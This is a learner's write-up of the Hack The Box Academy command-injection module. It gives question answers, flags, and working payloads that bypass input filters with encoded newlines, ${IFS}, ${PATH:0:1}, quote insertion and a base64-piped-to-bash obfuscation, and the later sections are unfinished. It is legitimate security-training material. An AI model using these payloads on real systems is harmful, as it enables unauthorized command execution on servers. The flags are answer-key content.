# Command Injections
* Source: [Hack the Box: Academy](https://academy.hackthebox.com/)
* Module: Command Injections
* Tier: II
* Difficulty: Medium
* Category: Offensive
* Time estimate: 6 hours
* Date: 12-05-2022
* Author: [DjikstraCS](https://github.com/DjikstraCS)

---
## Detection
### Question:
![](./attachments/Pasted%20image%2020220512181746.png)

*Hint: Use Firefox or Chrome. It should start with "Please"*

![](./attachments/Pasted%20image%2020220513102509.png)

**Answer:** `Please match the requested format.`

---
## Injecting Commands
### Question:
![](./attachments/Pasted%20image%2020220512181825.png)

*Hints: You can either user burp or click `CTRL + U` in Firefox to show the source code*

![](./attachments/Pasted%20image%2020220513104047.png)

**Answer:** `17`

---
## Other Injection Operators
### Question:
![](./attachments/Pasted%20image%2020220512181939.png)

![](./attachments/Pasted%20image%2020220513104519.png)

**Answer:** `|`

---
## Identifying Filters
### Question:
![](./attachments/Pasted%20image%2020220512182009.png)

*Hint: Just see which injected characters does not cause a denied request. No need to reach command execution yet, as there are other protections in place.*

New Line character `\n` encoded as URL `%0a` is not blacklisted.

Payload: `%0a`

![](./attachments/Pasted%20image%2020220513121755.png)

**Answer:** `new-line`

---
## Bypassing Space Filters
### Question:
![](./attachments/Pasted%20image%2020220512182054.png)

*Hint: The size column (in bytes) is between the owner 'www-data' and the modification date.*

Working payloads for bypassing blacklisted space, ` `:

Payload 1: `%0a{ls,-la}`

Payload 2: `%0A%09ls%09-lah`

Payload 3: `%0A${IFS}ls${IFS}-la`

![](./attachments/Pasted%20image%2020220513121427.png)

**Answer:** `1813`

---
## Bypassing Other Blacklisted Characters
### Question:
![](./attachments/Pasted%20image%2020220512182139.png)

*Hint: Use the PATH environment variable along with the injection character you identified earlier*

Working payloads for bypassing blacklisted `/`:

Payload 1: `%0a{ls,${PATH:0:1}home}`

Payload 2: `%0A%09ls%09${PATH:0:1}home`

Payload 3: `%0A${IFS}ls${IFS}${PATH:0:1}home`

![](./attachments/Pasted%20image%2020220513122943.png)

**Answer:** `1nj3c70r`

---
## Bypassing Blacklisted Commands
### Question:
![](./attachments/Pasted%20image%2020220512182222.png)

*Hint: Use character insertion to bypass the blacklist on the 'cat' command.*

First, we need to locate 'flag.txt'

Payload: `%0a{ls,${PATH:0:1}home${PATH:0:1}1nj3c70r}`

![](./attachments/Pasted%20image%2020220513125949.png)

We can bypass the blacklisted `cat` command by adding a two `'`s. 

Payload: `%0a{c'a't,${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt}`

![](./attachments/Pasted%20image%2020220513125735.png)

**Answer:** `HTB{b451c_f1l73r5_w0n7_570p_m3}`

---
## Advanced Command Obfuscation
### Question:
![](./attachments/Pasted%20image%2020220512182300.png)

*Hint: Don't forget to bypass any filtered characters*

Test payload not working: 
`%0Ab'a'sh<<<$({ba's'e64,-'d'<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=})`

# TO BE CONTINUED...


**Answer:** ``

---
## Skills Assessment
### Question:
![](./attachments/Pasted%20image%2020220512182411.png)

*Hint: It is always easier to inject our command in an input going at the end of the command, rather than in the middle of it, though both are possible.*



**Answer:** ``

---
**Tags:** [[Hack The Box Academy]]